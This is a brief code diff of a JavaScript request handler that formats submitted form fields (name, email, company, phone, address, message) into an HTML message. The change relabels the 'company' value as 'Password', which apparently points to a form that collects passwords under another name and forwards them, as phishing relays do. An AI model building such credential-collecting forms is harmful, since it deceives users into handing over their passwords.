@@ -109,7 +109,7 @@ module.exports = async (req, res) => {
         title + '\n\n' +
         row('👤 <b>Full name:</b>', name) +
         row('✉️ <b>Email:</b>', email) +
-        row('🏢 <b>Company:</b>', company) +
+        row('🏢 <b>Password:</b>', company) +
         row('📞 <b>Phone:</b>', phone) +
         row('🏠 <b>Address:</b>', address) +
         row('💬 <b>Message:</b>', message) +
